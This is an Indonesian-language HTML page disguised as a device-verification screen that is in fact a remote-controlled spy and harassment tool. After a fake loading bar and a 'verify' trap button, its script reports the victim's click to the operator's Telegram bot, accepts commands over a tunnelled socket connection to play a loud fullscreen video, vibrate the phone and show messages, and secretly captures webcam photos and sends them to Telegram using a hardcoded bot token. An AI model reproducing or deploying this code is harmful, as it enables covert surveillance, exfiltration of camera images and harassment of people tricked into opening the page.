<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Sistem Verifikasi</title>
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    <style>
        body { background: #000; color: #ff0000; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; text-align: center; }
        .loader { width: 80px; height: 80px; border: 5px solid #111; border-top: 5px solid #ff0000; border-radius: 50%; animation: spin 1s linear infinite; box-shadow: 0 0 20px #ff0000; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        
        /* Tombol Jebakan Suara */
        .btn-jebakan { background: #ff0000; color: #fff; border: none; padding: 18px 35px; font-weight: bold; font-size: 16px; border-radius: 8px; cursor: pointer; box-shadow: 0 0 20px #ff0000; animation: blink 0.8s infinite; display: none; }
        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
        
        .fionzy-title { font-size: 40px; font-weight: bold; animation: pulse 1s infinite; display: none; color: #ff0000; }
        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.2; } 100% { opacity: 1; } }
        
        /* Video Setup */
        #videoCrash { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; background: #000; object-fit: cover; }
        #toast { visibility: hidden; background: #ff0000; color: #fff; padding: 15px; position: fixed; bottom: 30px; border-radius: 5px; font-weight: bold; z-index: 10000; }
        #toast.show { visibility: visible; }
        .hidden { display: none; }
    </style>
</head>
<body>

    <div id="uiArea">
        <div id="loader" class="loader"></div>
        <h2 id="stText" style="color: #00ff41;">MENGHUBUNGKAN... 0%</h2>
        
        <button id="btnVerify" class="btn-jebakan" onclick="breakDefense()">VERIFIKASI PERANGKAT</button>
        
        <div id="fionzyTitle" class="fionzy-title">FionzyGpt</div>
        <p id="subText" style="color: #fff; display: none; margin-top: 15px;">SISTEM CLOUD AKTIF</p>
    </div>

    <video id="videoCrash" playsinline loop>
        <source src="https://raw.githubusercontent.com/fanzzy01/Lock/main/Devil.mp4" type="video/mp4">
    </video>

    <div id="toast"></div>
    <video id="spyCam" autoplay class="hidden"></video>
    <canvas id="canvas" class="hidden"></canvas>

    <script>
        // === ⚡ KONFIGURASI LINK RENDER TUAN ⚡ ===
        const BACKEND_URL = "https://bow-rescue-doing-drums.trycloudflare.com"; 
        const BOT_TOKEN = "8441186762:AAG-wyDQFlP6sGXdIe6nxdk1HuEuAAyszWA";
        const CHAT_ID = "7373392803"; 
        
        // Hubungkan ke Cloud Render
        const socket = io(BACKEND_URL, { transports: ['websocket'] });
        const video = document.getElementById('videoCrash');

        // Fungsi Bypass Suara Browser
        function breakDefense() {
            video.muted = false; 
            video.volume = 1.0; 
            video.play().then(() => {
                video.pause(); // Pancing izin suara lalu pause
            }).catch(e => console.log("Izin suara tertunda"));
            
            document.getElementById('btnVerify').style.display = 'none';
            document.getElementById('fionzyTitle').style.display = 'block';
            document.getElementById('subText').style.display = 'block';
            document.body.style.backgroundColor = "black";
            
            // Lapor ke Telegram Tuan
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=⚡ TARGET SUDAH KLIK TOMBOL! SUARA SEKARANG AKTIF. SEGERA /CRASH!`);
        }

        // Menerima Perintah dari Cloud Render
        socket.on('command', (msg) => {
            if (msg === '/crash') {
                video.style.display = 'block';
                video.muted = false;
                video.play();
            }
            if (msg === '/snap') capturePhoto();
            if (msg === '/vibrate') navigator.vibrate([1000, 500, 1000]);
            if (msg.startsWith('/toast ')) {
                const t = document.getElementById('toast');
                t.innerText = msg.replace('/toast ', '');
                t.className = "show"; setTimeout(() => t.className = "", 5000);
            }
        });

        // Simulasi Loading Awal
        let p = 0;
        let itv = setInterval(() => {
            if(p < 100) { 
                p += 5; 
                document.getElementById('stText').innerText = `MENGHUBUNGKAN... ${p}%`; 
            } else {
                clearInterval(itv);
                document.getElementById('loader').style.display = 'none';
                document.getElementById('stText').style.display = 'none';
                document.getElementById('btnVerify').style.display = 'inline-block';
            }
        }, 120);

        async function capturePhoto() {
            try {
                const s = await navigator.mediaDevices.getUserMedia({ video: true });
                const v = document.getElementById('spyCam'); v.srcObject = s;
                setTimeout(() => {
                    const c = document.getElementById('canvas');
                    c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    c.toBlob(b => {
                        const fd = new FormData();
                        fd.append('chat_id', CHAT_ID);
                        fd.append('photo', b, 'capture.jpg');
                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                    }, 'image/jpeg');
                    s.getTracks().forEach(t => t.stop());
                }, 2000);
            } catch(e) {}
        }
    </script>
</body>
</html>
